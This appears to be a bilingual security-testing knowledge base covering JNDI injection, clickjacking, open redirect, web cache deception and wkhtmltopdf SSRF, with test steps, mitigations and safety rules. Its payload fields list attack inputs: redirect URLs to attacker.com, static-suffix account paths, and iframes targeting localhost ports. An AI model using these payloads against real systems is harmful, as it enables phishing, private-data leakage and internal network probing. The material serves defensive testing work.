analysis.en: Positive evidence requires the target application process to invoke a JNDI provider because of controlled input and send a tokenized request to the matching protocol endpoint; object loading or RCE needs separate safe-marker evidence. False-positive boundary: Logged or reflected URIs, analyst DNS resolution, scanner access, provider denial, JDK blocking remote codebases, uncorrelated callbacks, or existing local JNDI configuration does not prove injection execution.

opsecTips.zh: JNDI 测试禁止返回 Reference/Class/Gadget 或反连，且每协议一次；出现类加载、对象反序列化、非自有目标、进程、下载或请求风暴时停止。
opsecTips.en: JNDI testing never returns references, classes, gadgets, or callbacks and uses one request per protocol; stop on class loading, object deserialization, non-owned targets, processes, downloads, or request storms.

opsecTips.zh: 关闭 DNS/LDAP/RMI 端点，删除 token 和命名记录，清理应用/JNDI 缓存与日志，恢复 provider allowlist/信任设置并重启测试进程。
opsecTips.en: Close DNS, LDAP, and RMI endpoints, delete tokens and naming records, clear application and JNDI caches and logs, restore provider allowlists and trust settings, and restart test processes.

name.zh: 透明覆盖式点击劫持

description.zh: 验证敏感页面是否可被跨站 iframe 嵌入并以透明覆盖诱导用户在错误视觉语境中触发真实操作。
description.en: Tests whether a sensitive page can be embedded cross-origin and transparently overlaid so a user triggers a real action under a misleading visual context.

subCategory.zh: 跨站框架 UI 重叠

overview.zh: 原 HTML 使用低透明度 iframe 与诱导按钮模拟 UI 重叠。成功条件不是攻击页能渲染 iframe 标签，而是目标敏感页面在不同源顶层页中实际加载，且一次真实用户点击落在预期敏感控件上。
overview.en: The source HTML uses a low-opacity iframe and lure button to model UI overlap. Success is not rendering an iframe tag; the sensitive target must actually load inside a cross-origin top-level page and one real user click must land on the intended sensitive control.

vulnerability.zh: 目标未通过 CSP frame-ancestors 或 X-Frame-Options 限制嵌入，并把有影响的操作放在可预测位置且缺少再认证或明确确认。SameSite Cookie 不一定阻止顶层站点中的 iframe 携带会话，需按实际浏览器验证。
vulnerability.en: The target lacks CSP frame-ancestors or X-Frame-Options restrictions and places consequential controls at predictable coordinates without reauthentication or explicit confirmation. SameSite cookies do not necessarily prevent a framed page from carrying a session, so browser behavior must be tested.

exploitation.zh: 步骤一在独立测试域加载目标敏感页面并记录控制台与响应头；步骤二使用原始透明 iframe 布局对齐测试账号的无害操作，捕获点击坐标和状态变化；步骤三加入 frame-ancestors 后重放并使用非敏感页对照，排除登录页重定向、框架空白或攻击页自身按钮响应造成的假阳性。
exploitation.en: First load the sensitive target from a separate test origin and record console output and response headers. Align the original transparent iframe layout with a harmless action on a test account and capture click coordinates and state change. Replay after adding frame-ancestors and compare a nonsensitive page to exclude login redirects, blank frames, or the attack page's own button as false positives.

mitigation.zh: 使用 CSP frame-ancestors 精确限制允许嵌入的源，并为旧客户端保留 X-Frame-Options；对转账、权限变更等操作要求再认证或清晰确认；避免可预测的一键敏感控件并保留跨源浏览器回归。
mitigation.en: Use CSP frame-ancestors to restrict embedding origins precisely and retain X-Frame-Options for legacy clients. Require reauthentication or explicit confirmation for transfers and privilege changes. Avoid predictable one-click sensitive controls and maintain cross-origin browser regressions.

description.zh: 从独立测试域加载目标并记录 frame-ancestors、X-Frame-Options 与会话状态。
description.en: Load the target from a separate test origin and record frame-ancestors, X-Frame-Options, and session state.

description.zh: 回放原始 iframe 覆盖布局，以测试账号执行可回滚操作并记录真实点击命中。
description.en: Replay the original iframe overlay with a test account, perform a reversible action, and record the actual click target.

description.zh: 部署 frame-ancestors 和确认步骤后复测，确认授权嵌入保留且跨源诱导流程被阻断。
description.en: Retest after frame-ancestors and confirmation controls to preserve authorized embedding while blocking cross-origin lure flows.

review.rationale: 原内容为透明 iframe 与 UI 重叠，应保留点击劫持分类并补齐浏览器与真实状态变化证据。

prerequisites.zh: 敏感页面可被跨源 iframe 嵌入，测试浏览器真实执行 X-Frame-Options/CSP frame-ancestors，目标操作需要可模拟的用户点击。
prerequisites.en: A sensitive page can be embedded cross-origin, the test browser enforces actual X-Frame-Options or CSP frame-ancestors, and the target action requires a simulatable user click.

prerequisites.zh: 使用隔离敏感操作和测试账户，在可见调试模式先对齐 iframe/诱饵按钮，再以自动化截图、坐标和网络事件验证，不操作真实功能。
prerequisites.en: An isolated sensitive action and test account align iframe and decoy controls in visible debug mode before automated screenshots, coordinates, and network events validate behavior without touching real functions.

analysis.zh: 阳性证据是跨源 iframe 成功加载且受控一次点击落在真实敏感控件上，触发专用 marker 操作；嵌入、坐标和服务端事件需对应。 假阳性边界：iframe 标签存在、浏览器显示空白/阻止页、截图视觉重叠但点击落在诱饵、需多次非预期交互、SameSite/CSP 阻断操作或仅缺少 Header 均不是可利用链。
analysis.en: Positive evidence requires the cross-origin iframe to load and one controlled click to land on the real sensitive control and trigger a dedicated marker action, correlating embedding, coordinates, and server event. False-positive boundary: An iframe tag, blank or blocked frame, visual overlap with clicks landing on the decoy, multiple unexpected interactions, SameSite or CSP blocking, or a missing header alone does not prove an exploitable chain.

opsecTips.zh: 点击劫持测试只触发无副作用 marker，禁止转账/授权/删除；出现真实业务动作、非测试账户、焦点劫持、弹窗或用户交互时停止。
opsecTips.en: Clickjacking testing triggers a side-effect-free marker only and forbids transfers, authorization, or deletion; stop on real business actions, nontest accounts, focus hijacking, popups, or user interaction.

opsecTips.zh: 关闭测试父页/iframe，会话退出并删除 marker 操作，清理浏览器存储/截图/录屏，恢复 frame-ancestors/XFO 后回归。
opsecTips.en: Close test parent pages and frames, sign out and delete marker actions, clear browser storage, screenshots, and recordings, restore frame-ancestors or XFO, and regress.

name.zh: 未验证目标开放重定向

description.zh: 验证重定向端点是否接受绝对、协议相对或反斜杠规范化后的外部目标，并向浏览器返回攻击者控制的位置。
description.en: Tests whether a redirect endpoint accepts absolute, scheme-relative, or backslash-normalized external destinations and sends the browser to an attacker-controlled location.

overview.zh: 原集合同时包含服务端 redirect 参数与一个 rel=opener 链接片段。核心判定应围绕服务端或客户端导航最终是否离开允许源；链接本身指向外站并不自动是漏洞，只有应用将不可信目标包装成可信跳转或 opener 信任才有影响。
overview.en: The source combines redirect parameters with a rel=opener link fragment. Review whether navigation ultimately leaves the allowed origin; an ordinary external link is not automatically a vulnerability unless the application wraps an untrusted destination in a trusted redirect or exposes opener trust.

vulnerability.zh: 应用按字符串前缀、未经规范化的 Host 或不完整 allowlist 校验目标，再由不同 URL 解析器处理协议相对、反斜杠和编码分隔符时，会产生目标解析差异。影响包括钓鱼信任放大和 OAuth 回调链劫持。
vulnerability.en: Destination confusion arises when an application validates string prefixes, an unnormalized host, or an incomplete allowlist before a different URL parser handles scheme-relative forms, backslashes, and encoded separators. Impact includes trusted-domain phishing and OAuth callback-chain abuse.

exploitation.zh: 步骤一用站内相对路径记录 Location 与浏览器最终 URL；步骤二逐项提交原始外部、协议相对和反斜杠变体，捕获每一跳状态码、Location 与规范化主机；步骤三用普通外链和无导航的响应作对照，排除仅回显参数、浏览器阻止弹窗或测试代理改写造成的假阳性。
exploitation.en: First record Location and the browser's final URL with an internal relative path. Submit each original external, scheme-relative, and backslash variant and capture status, Location, and normalized host for every hop. Compare an ordinary external link and a nonnavigation response to exclude parameter echo, popup blocking, or test-proxy rewriting as false positives.

mitigation.zh: 优先只接受服务端映射的目标 ID 或站内相对路径；必须允许外部跳转时，用标准解析器统一解码并精确匹配协议、主机和端口；拒绝用户信息、反斜杠和控制字符，并为 OAuth 回调使用独立严格 allowlist。
mitigation.en: Prefer server-mapped destination identifiers or internal relative paths. If external redirects are required, normalize with one standard parser and exactly match scheme, host, and port. Reject userinfo, backslashes, and control characters, and maintain a separate strict allowlist for OAuth callbacks.

description.zh: 记录合法相对路径的服务端 Location、浏览器规范化结果和完整重定向链。
description.en: Record server Location, browser normalization, and the complete redirect chain for a valid relative path.

description.zh: 回放原始目标变体并逐跳比较应用校验值、响应 Location 与浏览器最终主机。
description.en: Replay the original destination variants and compare the validated value, response Location, and browser final host at every hop.

attackChain.payload: /redirect?url=https://attacker.com /redirect?url=//attacker.com /redirect?url=/\attacker.com /redirect?url=//attacker.com%2f.. Click

description.zh: 切换到站内目标 ID 或严格 URL allowlist 后复测，确认业务跳转保留且外部主机被拒绝。
description.en: Retest after adopting internal destination IDs or a strict URL allowlist to preserve business redirects while rejecting external hosts.

review.rationale: 该条主体是重定向目标解析与外部导航，原开放重定向类别正确但需要去掉条数式名称并区分普通外链。

prerequisites.zh: 重定向端点把客户端目标交给 Location 或浏览器导航，最终 URL 解析与规范化发生在可观察链路中且允许测试外部源。
prerequisites.en: A redirect endpoint passes a client target to Location or browser navigation, with final URL parsing and canonicalization observable and an external test origin allowed.

prerequisites.zh: 所有 attacker 域替换为自有空页面和唯一 token，保存原始参数、完全解码值、服务端 Location、浏览器最终 URL 与请求 ID。
prerequisites.en: All attacker domains are replaced by an owned empty page and unique token, preserving raw parameter, fully decoded value, server Location, browser final URL, and request identifier.

analysis.zh: 阳性证据是端点接受可控绝对/协议相对/规范化变体，并让浏览器实际导航到自有外部源；服务端 Location 与最终 destination 一致。 假阳性边界：参数回显、302 指向站内中间页、浏览器阻止 scheme、只在客户端手工修改 URL、目标被登录页覆盖或 external 字符串出现在路径均不是开放重定向。
analysis.en: Positive evidence requires the endpoint to accept a controlled absolute, scheme-relative, or canonicalized variant and have the browser navigate to the owned external origin, with Location matching the final destination. False-positive boundary: Parameter reflection, a 302 to an internal interstitial, browser scheme blocking, manual client URL changes, a destination replaced by login, or an external string inside a path does not prove open redirect.

opsecTips.zh: 开放重定向测试只到自有空页面且单次导航；出现凭据/敏感 query 传递、真实用户跳转、下载、重定向循环或公共域时停止。
opsecTips.en: Open-redirect testing navigates once to an owned empty page only; stop on credentials or sensitive queries, real-user navigation, downloads, redirect loops, or public origins.

opsecTips.zh: 删除测试 token/重定向记录，清理 history、BFCache、代理/CDN 缓存和目标日志，恢复 allowlist 后重放站内/站外基线。
opsecTips.en: Delete test tokens and redirect records, clear history, BFCache, proxy and CDN caches plus destination logs, restore the allowlist, and replay internal and external baselines.

name.zh: 认证内容 Web 缓存欺骗

description.zh: 验证 CDN 或反向代理是否因伪静态后缀缓存包含用户私密数据的动态响应，并允许未认证请求读取同一缓存对象。
description.en: Tests whether a CDN or reverse proxy caches a dynamic response containing private user data because of a static-looking suffix and lets an unauthenticated request retrieve the same cache object.

overview.zh: 原路径把账户资源伪装成 .css、.js 或图片，测试源站路由与缓存键/缓存规则的差异。成功必须证明已认证响应先被共享缓存保存，随后不同会话或匿名客户端获得相同私密内容，而不是浏览器本地缓存。
overview.en: The source paths disguise account resources with CSS, JavaScript, or image suffixes and test disagreement between origin routing and cache policy. Success requires a shared cache to store an authenticated response and a different or anonymous client to retrieve the same private content; browser-local caching is not enough.

vulnerability.zh: 源站容忍路径后缀并仍返回动态账户页面，而边缘按扩展名认为资源可公开缓存，且缓存键忽略 Cookie 或 Authorization 时，会把个性化内容存入共享对象。仅看到 HIT 头不够，还要验证内容跨身份泄露。
vulnerability.en: If the origin tolerates suffixes and still returns a dynamic account page while the edge treats the extension as publicly cacheable and ignores Cookie or Authorization in its key, personalized content can enter a shared object. A HIT header alone is insufficient; content must leak across identities.

exploitation.zh: 步骤一用账号 A 请求正常动态路径并记录 Cache-Control、Age、Vary 与缓存键；步骤二以账号 A 访问原始伪静态路径，再由无 Cookie 客户端 B 请求同一路径；步骤三比较唯一用户 Canary、缓存节点和对象年龄，排除客户端缓存、源站公共测试数据或会话未清理造成的假阳性。
exploitation.en: First request the normal dynamic path as account A and record Cache-Control, Age, Vary, and key behavior. Have account A fetch the original static-looking path, then request the same path from cookie-free client B. Compare a user-specific canary, cache node, and object age to exclude client cache, public fixture data, or uncleared sessions as false positives.

mitigation.zh: 对认证和个性化响应设置 private、no-store 并在边缘禁止缓存；让源站严格匹配路径而不是忽略多余后缀；按认证状态隔离缓存键，统一 CDN 与应用路由规则，并用双客户端测试回归。
mitigation.en: Mark authenticated and personalized responses private and no-store and prevent edge caching. Make the origin reject surplus suffixes rather than routing through them. Separate cache keys by authentication state, align CDN and application routing, and maintain two-client regressions.

title.zh: 记录动态响应缓存策略

description.zh: 使用账号 A 保存正常账户路径的响应头、唯一内容和边缘缓存键基线。
description.en: Use account A to preserve response headers, unique content, and edge cache-key behavior for the normal account path.

title.en: Prime and anonymously read the cache

description.zh: 由账号 A 回放原始伪静态路径，再用无会话客户端请求同一缓存键并比较内容。
description.en: Have account A replay the original static-looking paths, then request the same cache key without a session and compare content.

attackChain.payload:
/account/settings.css
/account/profile.js
/user/info.png

description.zh: 拒绝多余后缀并禁止认证响应共享缓存后重放，确认公共静态资源仍命中而私密内容不缓存。
description.en: Replay after rejecting surplus suffixes and blocking shared caching of authenticated responses, preserving public static hits without private caching.

review.rationale: 路径后缀用于制造源站与边缘缓存规则差异，原缓存安全类别正确，成功证据必须是跨会话私密内容泄露。

prerequisites.zh: 认证动态页面位于 CDN/反向代理后，伪静态路径或后缀会影响缓存键/缓存规则，而源站仍路由到同一私密内容。
prerequisites.en: An authenticated dynamic page sits behind a CDN or reverse proxy where a fake-static path or suffix affects cache keys or rules while the origin still routes to the same private content.

prerequisites.zh: 使用专用测试账户和唯一无敏感 marker 响应，记录认证请求、Cache-Control/Age/X-Cache、缓存键、源站路由和随后未认证请求。
prerequisites.en: A dedicated test account and unique nonsensitive marker response record authenticated request, Cache-Control, Age, X-Cache, cache key, origin route, and a later unauthenticated request.

analysis.zh: 阳性证据是认证请求的 marker 内容因欺骗后缀被共享缓存，随后无认证客户端以同一缓存键收到该 marker 且源站未被再次调用。 假阳性边界：路径返回私密内容但 no-store/不缓存、第二请求命中浏览器私有缓存、源站再次生成公开内容、Age=0、缓存状态头误导或只泄露测试账户自己均不是共享泄露。
analysis.en: Positive evidence requires marker content from the authenticated request to be stored in a shared cache because of the deceptive suffix and returned to an unauthenticated client under the same key without a new origin call. False-positive boundary: Private content with no-store and no caching, a browser-private cache hit, a newly generated public origin response, Age zero, misleading cache headers, or exposure only to the same test account does not prove shared leakage.

opsecTips.zh: 缓存欺骗只使用无敏感 marker 和专用路径；发现真实用户内容、共享生产缓存、长 TTL、跨账户数据或无法立即 purge 时停止。
opsecTips.en: Cache-deception testing uses a nonsensitive marker and dedicated path only; stop on real-user content, shared production cache, long TTL, cross-account data, or inability to purge immediately.

opsecTips.zh: 立即 purge 专用缓存键及变体，删除测试账户/marker/源站记录，清理浏览器缓存并验证认证与未认证请求恢复隔离。
opsecTips.en: Immediately purge dedicated cache keys and variants, delete test accounts, markers, and origin records, clear browser caches, and verify authenticated and unauthenticated isolation.

name.zh: wkhtmltopdf 资源加载 SSRF 与本地文件读取
name.en: wkhtmltopdf Resource-Fetch SSRF and Local File Read

description.zh: 验证 wkhtmltopdf 渲染不受信 HTML 时是否主动加载回环、私网、云元数据或 file: 资源，并把内容带入生成 PDF。
description.en: Tests whether wkhtmltopdf rendering of untrusted HTML actively loads loopback, private-network, cloud-metadata, or file-scheme resources and embeds content in the generated PDF.

subCategory.zh: HTML 转 PDF 资源加载

overview.zh: iframe、图片和其他资源由服务器上的 wkhtmltopdf 进程解析，因此客户端 HTML 注入会转化为服务端网络与文件访问。原集合同时含 HTTP 内网地址和 file: 路径，应分别记录网络请求与 PDF 中真实文件内容。
overview.en: Iframes, images, and related resources are parsed by the server-side wkhtmltopdf process, so client-controlled HTML can become server-side network and file access. The source includes both internal HTTP targets and file paths, which require separate network and PDF-content evidence.

vulnerability.zh: 应用将用户 HTML 直接交给渲染器，且未限制 URL scheme、目标地址、DNS 解析或本地文件访问时，渲染进程会继承服务器网络位置和文件权限。空白 iframe 或渲染超时不能证明目标可读。
vulnerability.en: When an application sends user HTML directly to a renderer without restricting schemes, destinations, DNS resolution, or local file access, the renderer inherits the server's network position and file privileges. A blank iframe or render timeout does not prove that a target was readable.

exploitation.zh: 步骤一用受控外部 HTTP 资源记录渲染器 User-Agent、请求时序和 PDF 嵌入基线；步骤二逐项回放原始内网与 file: 载荷，关联受控回调、服务器连接日志和 PDF 唯一内容；步骤三阻断私网与本地文件后重放，排除客户端预览请求、DNS 扫描或占位图造成的假阳性。
exploitation.en: First use a controlled external HTTP resource to record renderer User-Agent, request timing, and PDF embedding. Replay each original internal and file-scheme input and correlate controlled callbacks, server connection logs, and unique PDF content. Replay after blocking private networks and local files to exclude client previews, DNS scanning, or placeholder images as false positives.

mitigation.zh: 对渲染输入采用资源 allowlist 并拒绝 file、gopher 与未知协议；在独立网络命名空间中阻断回环、链路本地和私网目标，并禁用本地文件访问；以最小权限运行渲染器并对最终 DNS 地址重复校验。
mitigation.en: Apply a resource allowlist and reject file, gopher, and unknown schemes. Block loopback, link-local, and private destinations in an isolated network namespace and disable local-file access. Run the renderer under least privilege and revalidate final DNS addresses.

description.zh: 使用受控资源记录 wkhtmltopdf 的网络来源、User-Agent 与生成 PDF 的嵌入行为。
description.en: Use a controlled resource to record wkhtmltopdf network origin, User-Agent, and embedding behavior in the generated PDF.

description.zh: 回放原始资源集合并分别关联服务端网络回调和 PDF 中的唯一文件内容。
description.en: Replay the original resource set and correlate server-side network callbacks and unique file content in the PDF separately.

attackChain.payload:
<iframe src="http://127.0.0.1/"></iframe>
<iframe src="http://127.0.0.1:8080/"></iframe>
<iframe src="http://127.0.0.1:3306/"></iframe>
